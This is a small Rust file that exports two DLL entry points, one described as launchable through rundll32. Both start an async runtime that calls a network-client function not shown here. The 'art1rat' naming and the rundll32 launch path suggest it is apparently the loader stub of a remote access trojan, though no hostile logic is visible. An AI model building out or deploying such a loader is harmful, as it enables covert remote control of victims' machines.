use std::ffi::c_int;

/// Entry point for DLL/SO loads.
/// Windows rundll32: rundll32.exe <dllpath>,NetClientMain
#[unsafe(no_mangle)]
pub extern "C" fn NetClientMain() {
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(crate::netclient_dll());
}

/// Generic C-callable entry point.
#[unsafe(no_mangle)]
pub extern "C" fn art1rat_main() -> c_int {
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(crate::netclient_dll());
    0
}
